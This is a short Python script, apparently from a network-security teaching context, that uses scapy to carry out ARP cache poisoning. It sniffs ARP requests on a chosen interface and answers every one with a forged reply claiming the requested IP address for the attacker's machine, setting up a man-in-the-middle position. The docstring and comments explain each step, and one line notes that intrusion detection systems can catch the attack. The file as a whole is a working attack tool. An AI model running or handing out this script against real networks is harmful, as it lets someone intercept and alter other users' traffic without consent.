#!/usr/bin/python3

"""
Simple MitM using the request the MAC address of a destination
by using the ARP protocol. Check results in arp cache with:

    $ sudo arp -an

Time until cache is refreshed differs per OS, and Intrusion
Detection Systems can detect ARP cache poisoning attacks.
"""

import sys
from scapy.all import sniff, sendp, ARP, Ether

if len (sys.argv) < 2:
    print (sys.argv[0] + ": <iface>")
    sys.exit(0)


def arp_poison_callback(packet):
    # Check the op code of the ARP packet: when 1 it is an
    # ARP request
    
    if packet [ARP].op == 1:
        # Generate a response packet, with source MAC and IP 
        # of the request packet as destination MAC and IP.

        answer = Ether(dst=packet[ARP].hwsrc) / ARP()
        answer[ARP].op = "is-at"
        answer[ARP].hwdst = packet[ARP].hwsrc
        answer[ARP].psrc = packet[ARP].pdst
        answer[ARP].pdst = packet[ARP].psrc

        print("Fooling " + packet[ARP].psrc + " that " + \
        packet[ARP].pdst + " is me")

        # Use sendp() to send on layer 2
        sendp (answer, iface = sys.argv[1])


# sniff() reads packets in an endless loop, the PCAP arp filters out
# ARP packets to give to the callback function, store=0 ensures the packet
# will only be saved in memory (not on hard disk).

sniff(prn = arp_poison_callback, filter="arp", iface=sys.argv[1], store=0)
